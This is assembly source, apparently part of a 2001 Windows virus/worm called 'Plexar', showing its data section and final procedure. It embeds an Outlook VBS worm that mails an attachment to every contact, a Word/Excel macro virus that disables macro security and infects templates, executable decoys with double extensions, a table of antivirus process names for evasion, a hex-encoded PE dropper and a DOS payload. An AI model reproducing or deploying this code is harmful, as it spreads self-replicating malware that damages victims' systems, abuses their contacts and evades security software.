                                DB      08h, "First", 02h, "A", 00h
                                DB      08h, "Next", 02h, "A", 00h
                                DB      08h, 05h, 00h
                                DB      09h, "Alloc", 00h
                                DB      09h, "Free", 00h
                                DB      06h, 0Ah, "s", 0Bh, "A", 00h
                                DB      06h, 0Ch, 0Bh, "A", 00h
                                DB      07h, 0Ch, 0Bh, "A", 00h
                                DB      01h, 0Eh, 00h
                                DB      "Exit", 0Eh, 00h
                                DB      0Dh, "MultipleObjects", 00h
                                DB      0Dh, "SingleObject", 00h
                                DB      06h, "TickCount", 00h
                                DB      "LoadLibraryA", 00h
                                DB      "Delete", 02h, "A", 00h
                                DB      07h, 0Eh, "Priority", 00h
                                DB      0FFh

  CreateFileA                   DD      00000000h
  CreateFileMappingA            DD      00000000h
  MapViewOfFile                 DD      00000000h
  UnmapViewOfFile               DD      00000000h
  CloseHandle                   DD      00000000h
  GetFileSize                   DD      00000000h
  SetFilePointer                DD      00000000h
  SetEndOfFile                  DD      00000000h
  SetFileAttributesA            DD      00000000h
  WriteFile                     DD      00000000h
  FindFirstFileA                DD      00000000h
  FindNextFileA                 DD      00000000h
  FindClose                     DD      00000000h
  VirtualAlloc                  DD      00000000h
  VirtualFree                   DD      00000000h
  GetWindowsDirectoryA          DD      00000000h
  GetCurrentDirectoryA          DD      00000000h
  SetCurrentDirectoryA          DD      00000000h
  CreateThread                  DD      00000000h
  ExitThread                    DD      00000000h
  WaitForMultipleObjects        DD      00000000h
  WaitForSingleObject           DD      00000000h
  GetTickCount                  DD      00000000h
  LoadLibraryA                  DD      00000000h
  DeleteFileA                   DD      00000000h
  SetThreadPriority             DD      00000000h

  KERNEL32                      DD      00000000h

  Thread_Directa                DD      00000000h
  Thread_WormVBS                DD      00000000h
  Thread_IWord                  DD      00000000h
  Thread_Host                   DD      00000000h

  Listo_Directa                 DB      00h

  GetProcAddress                DD      00000000h
  Exports                       DD      00000000h

  CRC32_GetProcAddress          EQU     0FFC97C1Fh
  l_GetProcAddress              EQU     0Fh

  Scriptum                      DD      00000000h
  GuardaNom                     DD      00000000h
  LargoVBS                      DB      00h
  FHandle_WVBS                  DD      00000000h
  MHandle_WVBS                  DD      00000000h
  BaseMap_WVBS                  DD      00000000h

  Gusano_VBS                    LABEL   NEAR
  DB  'On Error Resume Next', 0Dh, 0Ah
  DB  'Set Outlook = CreateObject("OutLook.Application")', 0Dh, 0Ah
  DB  'If ( Outlook <> "" ) Then', 0Dh, 0Ah
  DB  'With Outlook', 0Dh, 0Ah
  DB  'Set MAPI = .GetNameSpace("MAPI")', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'With MAPI', 0Dh, 0Ah
  DB  'Set AddrList = .AddressLists', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'For I = 1 to AddrList.Count', 0Dh, 0Ah
  DB  'With OutLook', 0Dh, 0Ah
  DB  'Set NuevoMail = .CreateItem(0)', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'Set LibroActual = AddrList.Item(I)', 0Dh, 0Ah
  DB  'With NuevoMail', 0Dh, 0Ah
  DB  '.Attachments.Add "'
  L_Gusano_VBS                   EQU     $-Gusano_VBS

  Gusano_VBS2                    LABEL   NEAR
  DB  '"', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'Set Yuca = LibroActual.AddressEntries', 0Dh, 0Ah
  DB  'With Yuca', 0Dh, 0Ah
  DB  'For J = 1 to .Count', 0Dh, 0Ah
  DB  'With NuevoMail', 0Dh, 0Ah
  DB  'Set bajo = .Recipients', 0Dh, 0Ah
  DB  'bajo.Add Yuca(J)', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'Next', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'With NuevoMail', 0Dh, 0Ah
  DB  '.Send', 0Dh, 0Ah
  DB  'End With', 0Dh, 0Ah
  DB  'Next', 0Dh, 0Ah
  DB  'Outlook.Quit', 0Dh, 0Ah
  DB  'End If', 0Dh, 0Ah
  L_Gusano_VBS2                  EQU    $-Gusano_VBS2

  Nombres_Varios                 DB      "XD", 00h
                                 DB      "Sex.jpg", 20d DUP (" "), ".exe", 00h
                                 DB      "Porno.gif", 20d DUP (" "), ".exe", 00h
                                 DB      "Free_XXX.jpg", 20d DUP (" "), ".exe", 00h
                                 DB      "Great_Music.mp3", 20d DUP (" "), ".exe", 00h
                                 DB      "Check_This.jpg", 20d DUP (" "), ".exe", 00h
                                 DB      "Cool_Pics.gif", 20d DUP (" "), ".exe", 00h
                                 DB      "Love_Story.html", 20d DUP (" "), ".exe", 00h
                                 DB      "Sexy_Screensaver.scr", 00h
                                 DB      "Free_Love_Screensaver.scr", 00h
                                 DB      "Eat_My_Shorts.scr", 00h

  Raxelp_vbs                     DB      "raxelp.vbs", 00h
  WScript_exe                    DB      "wscript.exe", 00h

  Tabla_Hex                      DB      "0123456789ABCDEF", 00h

  FHandle_IW                     DD     00000000h
  MHandle_IW                     DD     00000000h
  BaseMap_IW                     DD     00000000h
  Tama쨚_IW                      DD     00000000h
  Memoria_IW                     DD     00000000h
  Macaco                         DB      13d DUP (00h)
 
  Virus_Macro                    LABEL   NEAR
  DB     'Attribute VB_Name = "Plexar"', 0Dh, 0Ah
  DB     'Sub Auto_Open()', 0Dh, 0Ah
  DB     'Application.OnSheetActivate = "InfXL"', 0Dh, 0Ah
  DB     'End Sub', 0Dh, 0Ah
  DB     'Sub InfXL()', 0Dh, 0Ah
  DB     'On Error Resume Next', 0Dh, 0Ah
  DB     'Set AWO = Application.ActiveWorkbook', 0Dh, 0Ah
  DB     'Set VBP = Application.VBE.ActiveVBProject', 0Dh, 0Ah
  DB     'Set AXO = AWO.VBProject.VBComponents', 0Dh, 0Ah
  DB     'Set VBX = VBP.VBComponents', 0Dh, 0Ah
  DB     'With Application: .ScreenUpdating = Not -1: .DisplayStatusBar = Not -1: .EnableCancelKey = Not -1: .DisplayAlerts = Not -1: End With', 0Dh, 0Ah
  DB     'ZZZ = "Plexar": XXX = "c:\plx.$$$": YYY = Application.StartupPath & "\personal.xls"', 0Dh, 0Ah
  DB     'VBX.Item(ZZZ).Export XXX', 0Dh, 0Ah
  DB     'If AXO.Item(ZZZ).Name <> ZZZ Then', 0Dh, 0Ah
  DB     ' AXO.Import XXX: AWO.SaveAs AWO.FullName', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'If (Dir(YYY) = "") Then', 0Dh, 0Ah
  DB     'Workbooks.Add.SaveAs YYY', 0Dh, 0Ah
  DB     'Set AWO = Application.ActiveWorkbook', 0Dh, 0Ah
  DB     'Set AXO = AWO.VBProject.VBComponents', 0Dh, 0Ah
  DB     'AXO.Import XXX', 0Dh, 0Ah
  DB     'ActiveWindow.Visible = Not -1', 0Dh, 0Ah
  DB     'Workbooks("personal.xls").Save', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'Kill XXX', 0Dh, 0Ah
  DB     'Call Correme', 0Dh, 0Ah
  DB     'End Sub', 0Dh, 0Ah
  DB     'Sub AutoClose()', 0Dh, 0Ah
  DB     'On Error Resume Next', 0Dh, 0Ah
  DB     'ZZZ = "Plexar": XXX = "c:\plx.$$$"', 0Dh, 0Ah
  DB     'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"', 0Dh, 0Ah
  DB     'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = "1"', 0Dh, 0Ah
  DB     'With Options: .VirusProtection = (2 * 4 + 4 / 6 - 2): .ConfirmConversions = (2 * 4 + 4 / 6 - 2): End With', 0Dh, 0Ah
  DB     'With Application: .DisplayStatusBar = (2 * 4 + 4 / 6 - 2): End With', 0Dh, 0Ah
  DB     'Set AKT = VBE.ActiveVBProject.VBComponents', 0Dh, 0Ah
  DB     'Set NOX = NormalTemplate.VBProject.VBComponents', 0Dh, 0Ah
  DB     'Set DOX = ActiveDocument.VBProject.VBComponents', 0Dh, 0Ah
  DB     'AKT.Item(ZZZ).Export XXX', 0Dh, 0Ah
  DB     'If (NOX.Item(ZZZ).Name <> ZZZ) Then', 0Dh, 0Ah
  DB     'NOX.Import XXX', 0Dh, 0Ah
  DB     'NormalTemplate.Save', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'If (DOX.Item(ZZZ).Name <> ZZZ) Then', 0Dh, 0Ah
  DB     'DOX.Import XXX', 0Dh, 0Ah
  DB     'ActiveDocument.SaveAs ActiveDocument.FullName', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'Kill XXX', 0Dh, 0Ah
  DB     'Call Correme', 0Dh, 0Ah
  DB     'End Sub', 0Dh, 0Ah
  DB     'Private Sub Correme()', 0Dh, 0Ah
  DB     'On Error Resume Next', 0Dh, 0Ah
  DB     'Dim joda as String', 0Dh, 0Ah
  DB     'Dim X as String', 0Dh, 0Ah
  DB     'joda = "'
  L_Virus_Macro                  EQU     $-Virus_Macro

  Virus_Macro_2                  LABEL   NEAR
  DB     'For o = 1 to Len(joda) Step 2', 0Dh, 0Ah
  DB     'X = X + Chr("&h" + Mid(Joda, o, 2))', 0Dh, 0Ah
  DB     'Next', 0Dh, 0Ah
  DB     'raxname = Environ("windir") & "\raxelp.exe"', 0Dh, 0Ah
  DB     'Open raxname For Binary As #1', 0Dh, 0Ah
  DB     'Put #1, 1, X$', 0Dh, 0Ah
  DB     'Close #1', 0Dh, 0Ah
  DB     'xoxo = Shell(raxname, 0)', 0Dh, 0Ah
  DB     'End Sub', 0Dh, 0Ah
  L_Virus_Macro_2                EQU     $-Virus_Macro_2

  Nihil                          DB      00h
  Memoria                        DD      00000000h
  Raxelp_$$$                     DB      "c:\raxelp.$$$", 00h
  Plxwrd_vbs                     DB      "plxwrd.vbs", 00h

  Macro_VBS                      LABEL   NEAR
  DB     'On Error Resume Next', 0Dh, 0Ah
  DB     'Set word = CreateObject("Word.Application")', 0Dh, 0Ah
  DB     'If ( word <> "" ) Then', 0Dh, 0Ah
  DB     'word.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"', 0Dh, 0Ah
  DB     'word.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = "1"', 0Dh, 0Ah
  DB     'Set maca = word.Application.NormalTemplate.VBProject.VBComponents', 0Dh, 0Ah
  DB     'If maca.Item("Plexar").Name <> "Plexar" Then', 0Dh, 0Ah
  DB     'maca.Import "c:\raxelp.$$$"', 0Dh, 0Ah
  DB     'word.Application.NormalTemplate.Save', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'Set fso = CreateObject("Scripting.FileSystemObject")', 0Dh, 0Ah
  DB     'Set excel = CreateObject("Excel.Application")', 0Dh, 0Ah
  DB     'If ( excel <> "" ) Then', 0Dh, 0Ah
  DB     'yyy = excel.Application.StartupPath & "\personal.xls"', 0Dh, 0Ah
  DB     'If (fso.FileExists(yyy) = False) Then', 0Dh, 0Ah
  DB     'excel.WorkBooks.Add.SaveAs yyy', 0Dh, 0Ah
  DB     'excel.Application.ActiveWorkbook.VBProject.VBComponents.Import "c:\raxelp.$$$"', 0Dh, 0Ah
  DB     'excel.ActiveWindow.Visible = Not -1', 0Dh, 0Ah
  DB     'excel.Workbooks("personal.xls").Save', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  DB     'excel.Application.Quit', 0Dh, 0Ah
  DB     'End If', 0Dh, 0Ah
  Largo_MVBS                     EQU     $-Macro_VBS

  FHandle_DPE                    DD      00000000h
  MHandle_DPE                    DD      00000000h
  BaseMap_DPE                    DD      00000000h

  DROPPER               LABEL   NEAR

  DB       04Dh, 038h, 05Ah, 050h, 038h, 002h, 067h, 002h
  DB       004h, 007h, 00Fh, 007h, 0FFh, 01Ch, 010h, 0B8h
  DB       0E1h, 048h, 001h, 040h, 0E0h, 01Ah, 0E1h, 00Ah
  DB       0B3h, 001h, 01Ch, 006h, 0BAh, 010h, 000h, 00Eh
  DB       01Fh, 0B4h, 009h, 0CDh, 021h, 07Dh, 0B8h, 067h
  DB       04Ch, 00Ah, 090h, 010h, 054h, 068h, 069h, 073h
  DB       007h, 020h, 070h, 072h, 06Fh, 067h, 033h, 061h
  DB       06Dh, 0C7h, 027h, 075h, 0C7h, 074h, 0D3h, 062h
  DB       065h, 0C7h, 0FFh, 00Fh, 06Eh, 099h, 006h, 064h
  DB       0E7h, 0C7h, 0D3h, 057h, 069h, 0D0h, 033h, 032h
  DB       00Dh, 01Ch, 00Ah, 024h, 037h, 029h, 001h, 057h
  DB       063h, 050h, 045h, 00Eh, 008h, 04Ch, 001h, 005h
  DB       001h, 099h, 02Bh, 05Ch, 0A3h, 058h, 014h, 0E0h
  DB       0E0h, 08Eh, 004h, 081h, 00Bh, 001h, 002h, 019h
  DB       08Dh, 019h, 022h, 007h, 08Ah, 010h, 004h, 064h
  DB       020h, 099h, 01Eh, 056h, 00Ch, 041h, 053h, 001h
  DB       01Fh, 038h, 003h, 029h, 00Ah, 009h, 012h, 070h
  DB       036h, 04Dh, 002h, 0A4h, 01Fh, 0A4h, 035h, 053h
  DB       020h, 008h, 07Bh, 0A5h, 04Bh, 02Bh, 001h, 0B2h
  DB       097h, 0A2h, 02Eh, 00Ah, 060h, 038h, 052h, 0BCh
  DB       0A1h, 0D4h, 061h, 0F8h, 0EBh, 0C1h, 043h, 04Fh
  DB       044h, 045h, 05Bh, 0D8h, 022h, 002h, 056h, 006h
  DB       024h, 095h, 0B7h, 007h, 0E0h, 044h, 041h, 054h
  DB       02Ah, 00Dh, 0CAh, 004h, 091h, 012h, 035h, 008h
  DB       050h, 07Ch, 0C3h, 0C0h, 007h, 02Eh, 069h, 064h
  DB       061h, 074h, 02Ah, 04Ch, 06Dh, 023h, 026h, 03Ch
  DB       0D4h, 028h, 0E0h, 072h, 065h, 06Ch, 023h, 06Fh
  DB       063h, 091h, 050h, 0C8h, 01Ch, 056h, 040h, 050h
  DB       073h, 0E4h, 063h, 0E1h, 01Dh, 022h, 01Ch, 08Ah
  DB       01Eh, 028h, 054h, 0E1h, 05Ah, 001h, 0FFh, 0B0h
  DB       033h, 0C0h, 050h, 084h, 030h, 0E8h, 01Dh, 019h
  DB       068h, 088h, 013h, 0DEh, 00Ah, 099h, 007h, 015h
  DB       06Ah, 091h, 00Eh, 006h, 007h, 0FFh, 025h, 050h
  DB       040h, 01Ch, 00Dh, 054h, 086h, 045h, 05Ch, 04Bh
  DB       001h, 0FEh, 0BFh, 0C9h, 03Ch, 0F1h, 0D4h, 0C6h
  DB       064h, 019h, 065h, 050h, 009h, 048h, 02Ch, 014h
  DB       071h, 089h, 05Ch, 03Eh, 03Eh, 0F8h, 033h, 07Ch
  DB       031h, 084h, 0A4h, 063h, 092h, 0E5h, 06Ah, 014h
  DB       007h, 04Bh, 045h, 052h, 04Eh, 030h, 04Ch, 033h
  DB       032h, 02Eh, 038h, 064h, 06Ch, 0F0h, 035h, 055h
  DB       053h, 01Ch, 036h, 00Bh, 002h, 0F9h, 0D9h, 065h
  DB       0C6h, 0F4h, 031h, 080h, 045h, 078h, 069h, 074h
  DB       050h, 072h, 03Fh, 06Fh, 063h, 038h, 073h, 0EFh
  DB       01Dh, 058h, 02Ah, 06Bh, 04Dh, 0C7h, 017h, 061h
  DB       067h, 094h, 041h, 0CFh, 001h, 0AAh, 0D7h, 0B6h
  DB       097h, 00Eh, 01Fh, 030h, 025h, 04Eh, 02Bh, 097h
  DB       07Fh, 004h, 0BEh, 004h, 0B2h, 02Fh, 07Ah, 03Bh
  DB       063h, 002h, 083h, 003h, 05Fh, 00Dh, 081h, 0E7h
  DB       080h, 00Eh, 091h, 011h, 038h, 056h, 020h, 08Bh
  DB       001h, 0F9h, 0F0h, 015h, 050h, 018h, 0B5h, 008h
  DB       014h, 0A0h, 094h, 068h, 030h, 0ACh, 00Ah, 0BFh
  DB       08Ah, 02Ch, 015h, 029h, 018h, 071h, 090h, 011h
  DB       0B4h, 060h, 001h, 0E8h, 002h, 04Eh, 08Ch, 02Fh
  DB       09Ch, 0C1h, 0F5h, 014h, 04Fh, 09Ch, 038h, 009h
  DB       038h, 049h, 032h, 044h, 009h, 05Fh, 027h, 043h
  DB       007h, 04Fh, 007h, 04Eh, 007h, 031h, 005h, 028h
  DB       067h, 0A4h, 005h, 040h, 04Ah, 04Ah, 004h, 028h
  DB       08Ah, 080h, 002h, 0DEh, 0D4h, 056h, 080h, 081h
  DB       077h, 0F1h, 049h, 007h, 046h, 002h, 013h, 06Dh
  DB       0C0h, 002h, 010h, 047h, 009h, 005h, 0FFh, 05Ch
  DB       003h, 03Bh, 0F8h, 0A4h, 007h, 0A2h, 002h, 08Ch
  DB       013h, 00Bh, 0AAh, 0C3h, 003h, 007h, 077h, 087h
  DB       097h, 036h, 078h, 009h, 063h, 00Ah, 018h, 0A2h
  DB       022h, 03Fh, 002h, 020h, 046h, 03Ch, 070h, 0FDh
  DB       033h, 00Ah, 0A2h, 04Bh, 0F0h, 086h, 016h, 0A1h
  DB       010h, 08Fh, 0E5h, 00Fh, 0C2h, 013h, 00Dh, 022h
  DB       007h, 088h, 008h, 05Fh, 0AAh, 09Bh, 010h, 06Fh
  DB       00Fh, 010h, 0ADh, 007h, 041h, 0C3h, 01Bh, 03Eh
  DB       020h, 0A2h, 01Dh, 072h, 04Eh, 0A4h, 040h, 0E1h
  DB       046h, 020h, 07Ch, 0DCh, 004h, 029h, 010h, 06Eh
  DB       039h, 04Fh, 008h, 09Ch, 0DEh, 088h, 06Bh, 010h
  DB       033h, 03Fh, 008h, 0F5h, 00Ah, 001h, 077h, 010h
  DB       0EDh, 01Bh, 094h, 00Bh, 087h, 020h, 0B1h, 080h
  DB       011h, 0C5h, 010h, 0A9h, 00Ah, 020h, 01Bh, 001h
  DB       016h, 087h, 04Ch, 021h, 008h, 08Eh, 03Eh, 019h
  DB       099h, 0FFh, 0E7h, 0D3h, 02Ah, 00Bh, 010h, 010h
  DB       06Fh, 009h, 016h, 02Ch, 019h, 021h, 091h, 08Ch
  DB       06Eh, 0F0h, 014h, 08Fh, 080h, 0F4h, 001h, 019h
  DB       011h, 018h, 092h, 0A2h, 09Dh, 03Fh, 09Fh, 01Dh
  DB       070h, 0A8h, 010h, 06Eh, 090h, 0CAh, 054h, 010h
  DB       07Fh, 089h, 0F9h, 008h, 080h, 0A3h, 0D6h, 07Ah
  DB       020h, 086h, 0EFh, 00Dh, 045h, 093h, 022h, 010h
  DB       0F0h, 00Dh, 043h, 0A8h, 09Ch, 010h, 0DBh, 062h
  DB       021h, 0C5h, 019h, 021h, 09Ch, 087h, 056h, 010h
  DB       0A0h, 071h, 007h, 069h, 07Fh, 042h, 009h, 0EBh
  DB       02Ah, 014h, 0F0h, 04Fh, 05Fh, 028h, 0CAh, 0F5h
  DB       020h, 005h, 090h, 014h, 008h, 099h, 097h, 0D3h
  DB       094h, 0F0h, 07Ah, 071h, 070h, 092h, 02Ch, 0DFh
  DB       0D2h, 0F2h, 004h, 0A0h, 04Ch, 0B1h, 0CAh, 031h
  DB       070h, 02Fh, 00Ah, 099h, 0A2h, 010h, 047h, 007h
  DB       0EAh, 005h, 033h, 020h, 009h, 054h, 081h, 011h
  DB       078h, 045h, 080h, 020h, 022h, 099h, 0D5h, 0C1h
  DB       010h, 048h, 002h, 050h, 020h, 009h, 06Ah, 090h
  DB       020h, 021h, 06Ah, 030h, 031h, 006h, 00Ah, 0A0h
  DB       059h, 00Ch, 023h, 04Eh, 070h, 029h, 02Ah, 0A2h
  DB       01Eh, 0B7h, 0B4h, 028h, 069h, 00Ah, 0D0h, 01Fh
  DB       047h, 079h, 004h, 097h, 05Ah, 060h, 04Ah, 0EFh
  DB       084h, 033h, 088h, 095h, 08Fh, 01Fh, 062h, 0ECh
  DB       09Ah, 055h, 072h, 0C4h, 070h, 071h, 020h, 04Ch
  DB       010h, 0E6h, 0C9h, 0E8h, 05Eh, 06Eh, 072h, 0BDh
  DB       001h, 075h, 0D6h, 0C0h, 000h

  Guarda_EIP                    DD      00000000h
  FHandle                       DD      00000000h
  MHandle                       DD      00000000h
  BaseMap                       DD      00000000h
  Tama쨚_1                      DD      00000000h
  Tama쨚_2                      DD      00000000h
  CRC_PLXR                      EQU     09EB7DF5h

  CRCNoInf                      DD      056B06AB2h
                                DD      0C4B3B3AEh
                                DD      09FAACC5Eh
                                DD      003E9FED8h
                                DD      071C0B944h
                                DD      0AEBB798Ch
                                DD      098BEBD89h
                                DD      0DA2CC2EBh
                                DD      0527EDB25h
                                DD      0EE9E3F8Bh
                                DD      0624D4378h
                                DD      00926128Ch
                                DD      0A6B26D55h
                                DD      0617F1F35h
                                DD      05AE2F365h
                                DD      085B3A1E3h
                                DD      05CE63D60h
                                DD      09EA8CB96h
                                DD      0A0AC0C6Dh

; -- LA FOQUIDA TABLA -- COPYRIGHT (C) 2001 MONGOLITO ENTERPRISES
;  "defr" 56B06AB2
;  "scan" C4B3B3AE
;  "anti" 9FAACC5E
;  "rund" 03E9FED8
;  "wscr" 71C0B944
;  "cscr" AEBB798C
;  "drwa" 98BEBD89
;  "smar" DA2CC2EB
;  "task" 527EDB25
;  "avpm" EE9E3F8B
;  "avp3" 624D4378
;  "avpc" 0926128C
;  "avwi" A6B26D55
;  "avco" 617F1F35
;  "vshw" 5AE2F365
;  "fp-w" 85B3A1E3
;  "f-st" 5CE63D60
;  "f-pr" 9EA8CB96
;  "f-ag" A0AC0C6D
; -- LA FOQUIDA TABLA -- COPYRIGHT (C) 2001 MONGOLITO ENTERPRISES

  IF DEBUG
  Mascara                       DB      "BAIT*.???", 00h
  ELSE
  Mascara                       DB      "*.???", 00h
  ENDIF
  Busqueda                      DB      SIZEOF_WIN32_FIND_DATA DUP (00h)
  RewtDir                       DB      MAX_PATH DUP (00h)
  BHandle                       DD      00000000h
  IF DEBUG
  Puto_Puto                     DB      ".", 00h
  ELSE
  Puto_Puto                     DB      "..", 00h
  ENDIF
  LargPP                        DD      00000000h
  CRC_EXE                       EQU     0F643C743h
  CRC_SCR                       EQU     096C10707h

  TempAPI                       DB      25d DUP (00h)
  ReSave                        DD      00000000h
  PackedAPIs                    DB      "X", 00h
                                DB      "Create", 00h
                                DB      "File", 00h
                                DB      "Map", 00h
                                DB      "View", 00h
                                DB      "Close", 00h
                                DB      "Get", 00h
                                DB      "Set", 00h
                                DB      "Find", 00h
                                DB      "Virtual", 00h
                                DB      "Window", 00h
                                DB      "Directory", 00h
                                DB      "Current", 00h
                                DB      "WaitFor", 00h
                                DB      "Thread", 00h
                                DB      0FFh

  PFHandle                      DD      00000000h
  PTemporal                     DD      00000000h
  CocoFrio                      DB      "c:\cocofrio.com", 00h
  Largo_CocoFrio                EQU     $-CocoFrio
  AutoExec                      DB      "c:\autoexec.bat", 00h

  Payload_Prog                  LABEL   NEAR

  DB       081h, 0FCh, 0C5h, 005h, 077h, 002h, 0CDh, 020h
  DB       0B9h, 037h, 002h, 0BEh, 037h, 003h, 0BFh, 065h
  DB       005h, 0BBh, 000h, 080h, 0FDh, 0F3h, 0A4h, 0FCh
  DB       087h, 0F7h, 083h, 0EEh, 0C6h, 019h, 0EDh, 057h
  DB       057h, 0E9h, 0EDh, 003h, 055h, 050h, 058h, 021h
  DB       00Bh, 001h, 004h, 008h, 0A7h, 0CBh, 0C1h, 082h
  DB       0C6h, 0B5h, 090h, 039h, 000h, 004h, 0A8h, 001h
  DB       006h, 0DDh, 0FFh, 0FFh, 0B4h, 02Ah, 0CDh, 021h
  DB       088h, 016h, 080h, 003h, 080h, 0FEh, 007h, 076h
  DB       019h, 033h, 0C0h, 08Ah, 0FEh, 0FFh, 0C6h, 0F6h
  DB       0E6h, 033h, 0D2h, 0B3h, 005h, 0F6h, 0F3h, 002h
  DB       0C2h, 02Ch, 004h, 03Ah, 006h, 092h, 0DFh, 018h
  DB       074h, 019h, 0EBh, 06Bh, 090h, 091h, 067h, 003h
  DB       004h, 0EFh, 0FFh, 075h, 054h, 0B8h, 012h, 000h
  DB       0CDh, 010h, 0B4h, 00Bh, 0BBh, 00Eh, 006h, 0BFh
  DB       0FDh, 002h, 033h, 0DBh, 0BAh, 000h, 009h, 008h
  DB       0B3h, 039h, 0BEh, 095h, 001h, 0C7h, 0FEh, 0E8h
  DB       003h, 070h, 0B3h, 028h, 0BEh, 0CAh, 007h, 024h
  DB       0BEh, 0DFh, 0CCh, 016h, 003h, 042h, 0CDh, 016h
  DB       0BEh, 054h, 09Bh, 0FBh, 003h, 0B3h, 01Eh, 0B8h
  DB       003h, 02Eh, 061h, 0B4h, 0FFh, 0FFh, 00Eh, 0ACh
  DB       00Ah, 0C0h, 074h, 010h, 0B9h, 038h, 000h, 051h
  DB       0B9h, 0FFh, 0FFh, 0E2h, 0FEh, 059h, 0F6h, 0DBh
  DB       0E2h, 0F7h, 016h, 0EBh, 0EBh, 0B8h, 000h, 04Ch
  DB       090h, 013h, 0D9h, 020h, 000h, 0C4h, 0FEh, 037h
  DB       03Ch, 020h, 050h, 04Ch, 045h, 058h, 041h, 052h
  DB       020h, 03Eh, 0B6h, 0FDh, 00Dh, 00Dh, 00Ah, 001h
  DB       000h, 028h, 06Fh, 057h, 02Eh, 000h, 06Dh, 061h
  DB       073h, 0DFh, 0FEh, 020h, 065h, 06Eh, 074h, 072h
  DB       065h, 074h, 005h, 069h, 064h, 06Fh, 020h, 06Eh
  DB       0FFh, 071h, 075h, 065h, 020h, 075h, 06Eh, 020h
  DB       070h, 016h, 065h, 06Fh, 07Eh, 0EBh, 018h, 020h
  DB       019h, 061h, 063h, 074h, 06Fh, 072h, 0B2h, 0E6h
  DB       029h, 041h, 038h, 0D8h, 096h, 01Bh, 070h, 033h
  DB       0DFh, 01Eh, 06Ch, 061h, 004h, 061h, 064h, 065h
  DB       063h, 0DFh, 0CAh, 06Fh, 020h, 03Bh, 06Dh, 062h
  DB       065h, 06Ch, 0B9h, 0B7h, 06Ch, 00Ch, 069h, 06Dh
  DB       069h, 05Fh, 0B6h, 0BDh, 012h, 075h, 072h, 062h
  DB       01Eh, 06Fh, 047h, 023h, 06Ch, 088h, 0ACh, 0B5h
  DB       06Ch, 02Ch, 050h, 04Fh, 06Dh, 0DBh, 04Bh, 020h
  DB       047h, 06Eh, 05Dh, 0B7h, 03Dh, 065h, 003h, 061h
  DB       04Fh, 06Ch, 008h, 0FBh, 020h, 067h, 06Fh, 063h
  DB       068h, 03Fh, 06Dh, 0D8h, 040h, 061h, 093h, 06Dh
  DB       041h, 061h, 091h, 061h, 0F7h, 076h, 0C6h, 069h
  DB       06Ch, 03Dh, 04Bh, 0B1h, 076h, 074h, 075h, 066h
  DB       020h, 03Eh, 00Eh, 061h, 080h, 079h, 020h, 0BDh
  DB       0FDh, 041h, 062h, 06Fh, 084h, 076h, 061h, 072h
  DB       06Eh, 0B6h, 073h, 06Eh, 045h, 078h, 07Fh, 0DBh
  DB       073h, 06Fh, 0C9h, 072h, 00Fh, 06Dh, 065h, 073h
  DB       0B2h, 0B3h, 06Dh, 081h, 000h, 043h, 0FFh, 0B7h
  DB       04Dh, 028h, 063h, 029h, 020h, 032h, 030h, 030h
  DB       02Fh, 0FFh, 031h, 020h, 04Ch, 069h, 074h, 065h
  DB       053h, 079h, 02Fh, 02Fh, 020h, 01Eh, 0DCh, 048h
  DB       065h, 0B6h, 049h, 056h, 0ADh, 0DDh, 003h, 065h
  DB       07Ah, 051h, 08Fh, 0BBh, 0EDh, 02Eh, 000h, 048h
  DB       068h, 074h, 09Ch, 072h, 06Fh, 015h, 00Eh, 018h
  DB       01Fh, 0DAh, 0CDh, 09Dh, 07Ah, 06Eh, 064h, 002h
  DB       005h, 0D7h, 034h, 05Dh, 0EEh, 0C3h, 009h, 0F9h
  DB       004h, 0EDh, 00Ah, 07Bh, 0F7h, 059h, 0C3h, 000h
  DB       000h, 040h, 0A8h, 000h, 000h, 000h, 000h, 020h
  DB       001h, 0FFh, 0A4h, 0E8h, 034h, 000h, 072h, 0FAh
  DB       041h, 0E8h, 029h, 000h, 0E3h, 035h, 073h, 0F9h
  DB       083h, 0E9h, 003h, 072h, 006h, 088h, 0CCh, 0ACh
  DB       0F7h, 0D0h, 095h, 031h, 0C9h, 0E8h, 015h, 000h
  DB       011h, 0C9h, 075h, 008h, 041h, 0E8h, 00Dh, 000h
  DB       073h, 0FBh, 041h, 041h, 041h, 08Dh, 003h, 096h
  DB       0F3h, 0A4h, 096h, 0EBh, 0CEh, 0E8h, 002h, 000h
  DB       011h, 0C9h, 001h, 0DBh, 075h, 004h, 0ADh, 011h
  DB       0C0h, 093h, 0C3h, 05Eh, 0B9h, 003h, 000h, 0ACh
  DB       02Ch, 0E8h, 03Ch, 001h, 077h, 0F9h, 0C1h, 004h
  DB       008h, 029h, 034h, 0ADh, 0E2h, 0F1h, 0C3h

  Largo_PProg                   EQU     $-Payload_Prog

  

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  DB 10h DUP (90h)

  Termina_Plexar                 LABEL   NEAR

  Mentira       PROC

  PUSH 0Ah                               ; lang_spanish
  PUSH 040000h + 080000h + 010h          ; mb_topmost & mb_right & mb_iconerror
  PUSH OFFSET Titulo
  PUSH OFFSET Mensaje
  PUSH 0
  CALL MessageBoxExA

  PUSH 0
  CALL ExitProcess

  MENTIRA       ENDP

End Empieza_Plexar
